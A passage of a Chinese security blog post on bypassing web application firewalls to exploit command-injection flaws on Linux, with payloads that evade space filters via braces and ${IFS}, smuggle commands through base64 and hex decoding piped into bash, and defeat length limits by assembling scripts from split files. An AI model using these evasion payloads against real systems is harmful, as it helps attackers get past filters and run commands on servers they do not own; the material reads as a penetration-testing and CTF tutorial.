+<p>与Windows相同这里不在赘述，只要区分大小写就可以</p>
+<h4 id="2-5-绕过空格过滤">2.5 绕过空格过滤</h4>
+<ul>
+<li>
+<p>在前端页面中可以利用%00,%0a,%0d等url编码来绕过空格的过滤，</p>
+</li>
+<li>
+<p>利用大括号来绕过空格限制</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;ls,-al&#125;</span><br><span class="line">&#123;ping,-c,2,127.0.0.1&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171628971.png" alt="图片"></p>
+<ul>
+<li>${IFS}绕过空格</li>
+</ul>
+<p>IFS是internal field separator的缩写，shell的特殊环境变量。shell根据IFS存储的值，可以是空格（040）、tab（011）、换行符（012）或者其他自定义符号，来解析输入和输出的变量值。这里echo -n是不进行自动换行</p>
+<p><img src="/2022/10/28/bypass/640-20221028171628962.png" alt="图片"></p>
+<p><img src="/2022/10/28/bypass/640-20221028171629014.png" alt="图片"></p>
+<h4 id="2-6-利用base64绕过命令限制">2.6 利用base64绕过命令限制</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo whoami|base64 //先输出whoami的base64编码</span><br><span class="line">`echo dwhvYW1pCg==|base64 -d` //将其base64解码</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171629024.png" alt="图片"></p>
+<h4 id="2-7-hex编码绕过">2.7 hex编码绕过</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># cat flag.php -&gt; 63617420666c61672e706870</span><br><span class="line">echo &quot;63617420666c61672e706870&quot;|xxd -r -p|bash</span><br><span class="line">#xxd: 二进制显示和处理文件工具,cat: 以文本方式ASCII显示文件#-r参数：逆向转换。将16进制字符串表示转为实际的数#-ps参数：以 postscript的连续16进制转储输出，也叫做纯16进制转储。#-r -p将纯十六进制转储的反向输出打印为了ASCII格式。</span><br><span class="line">cat flag.php -&gt; \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70#经测试，发现在php的ping环境上执行失败。在linux系统上执行成功$(printf &quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#123;printf,&quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;&#125;|bash`&#123;printf,&quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;&#125;`</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171629108.png" alt="图片"></p>
+<h4 id="2-8-长度限制绕过">2.8 长度限制绕过</h4>
+<ul>
+<li>方法一：</li>
+</ul>
+<p>可以利用base64解码的方式将脚本写入多个文件合并后再执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;cat flag.txt&quot; | base64   </span><br><span class="line"># 首先生成所需命令的base64字符串</span><br><span class="line"># Y2F0IGZsYWcudHh0Cg==</span><br><span class="line">echo -n Y2F0IG &gt; a</span><br><span class="line">echo -n ZsYWcu &gt;b</span><br><span class="line">echo -n dHh0Cg== &gt; c</span><br><span class="line">下面合并文件</span><br><span class="line">cat b &gt;&gt; acat c &gt;&gt; a</span><br><span class="line">解码文件</span><br><span class="line">base64 -d a &gt; shell.sh</span><br><span class="line">sh shell.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171629068.png" alt="图片"></p>
+<ul>
+<li>方法二：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">首先通过命令创建带有命令分隔的文件</span><br><span class="line">&gt; &quot;txt&quot;</span><br><span class="line">&gt; &quot;ag.\\&quot;</span><br><span class="line">&gt; &quot;fl\\&quot;</span><br><span class="line">&gt; &quot;t \\&quot;</span><br><span class="line">&gt; &quot;ca\\&quot;</span><br><span class="line">在用ls -t输出到一个文件中，再利用sh执行ls -t &gt; shell2.sh</span><br><span class="line">#如果创建空文件时，创建了点.开头的文件，上边命令要添加-a选项将隐藏文件也写入qwzf，即</span><br><span class="line">ls -at &gt; shell2.sh</span><br><span class="line">sh shell2.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/28/bypass/640-20221028171629122.png" alt="图片"></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BB%95waf/">绕waf</a></div><div class="post_share"><div class="social-share" data-image="/img/111.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/10/27/za/"><img class="prev-cover" src="/img/111.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">运维</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/01/ipc/"><img class="next-cover" src="/img/111.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">IPC连接</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avator.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">t1chm1</div><div class="author-info__description">道阻且长，行则将至</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/whmsec"><i class="fab fa-github"></i><span>github</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">道阻且长，行则将至</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87WAF%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">绕过WAF运行命令执行漏洞的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Windows%EF%BC%88%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 Windows（不区分大小写）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E7%AC%A6%E5%8F%B7%E5%92%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1 符号和命令的关系</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E4%BA%86%E8%A7%A3set%E5%91%BD%E4%BB%A4%E5%92%8CWindows%E5%8F%98%E9%87%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2 了解set命令和Windows变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-Windows%E5%88%87%E5%89%B2%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.1.3.</span> <span class="toc-text">1.3 Windows切割字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6%E5%9C%A8%E7%BB%95%E8%BF%87%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.4.</span> <span class="toc-text">1.4 逻辑运算符在绕过中的作用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Linux%EF%BC%88%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 Linux（区分大小写）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-linux%E4%B8%8B%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%92%8C%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 linux下的符号和逻辑运算符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E5%88%A9%E7%94%A8%E6%9C%AA%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 利用未被过滤的命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-linux%E7%AC%A6%E5%8F%B7%E4%B9%8B%E9%97%B4%E7%9A%84%E7%BB%84%E5%90%88"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 linux符号之间的组合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-linux%E5%88%87%E5%89%B2%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.2.4.</span> <span class="toc-text">2.4 linux切割字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">1.2.5.</span> <span class="toc-text">2.5 绕过空格过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-6-%E5%88%A9%E7%94%A8base64%E7%BB%95%E8%BF%87%E5%91%BD%E4%BB%A4%E9%99%90%E5%88%B6"><span class="toc-number">1.2.6.</span> <span class="toc-text">2.6 利用base64绕过命令限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-7-hex%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.7.</span> <span class="toc-text">2.7 hex编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-8-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.8.</span> <span class="toc-text">2.8 长度限制绕过</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/01/ipc/" title="IPC连接"><img src="/img/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IPC连接"/></a><div class="content"><a class="title" href="/2022/11/01/ipc/" title="IPC连接">IPC连接</a><time datetime="2022-11-01T03:35:35.000Z" title="发表于 2022-11-01 11:35:35">2022-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/28/bypass/" title="绕过WAF运行命令执行漏洞的方法"><img src="/img/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="绕过WAF运行命令执行漏洞的方法"/></a><div class="content"><a class="title" href="/2022/10/28/bypass/" title="绕过WAF运行命令执行漏洞的方法">绕过WAF运行命令执行漏洞的方法</a><time datetime="2022-10-28T09:15:41.000Z" title="发表于 2022-10-28 17:15:41">2022-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/27/za/" title="运维"><img src="/img/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="运维"/></a><div class="content"><a class="title" href="/2022/10/27/za/" title="运维">运维</a><time datetime="2022-10-27T11:34:31.000Z" title="发表于 2022-10-27 19:34:31">2022-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/27/Permission_dimension/" title="权限维持"><img src="/img/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="权限维持"/></a><div class="content"><a class="title" href="/2022/10/27/Permission_dimension/" title="权限维持">权限维持</a><time datetime="2022-10-27T08:55:43.000Z" title="发表于 2022-10-27 16:55:43">2022-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/26/pydictor/" title="pydictor 工具的妙用"><img src="/img/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pydictor 工具的妙用"/></a><div class="content"><a class="title" href="/2022/10/26/pydictor/" title="pydictor 工具的妙用">pydictor 工具的妙用</a><time datetime="2022-10-26T07:59:39.000Z" title="发表于 2022-10-26 15:59:39">2022-10-26</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2022 By t1chm1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
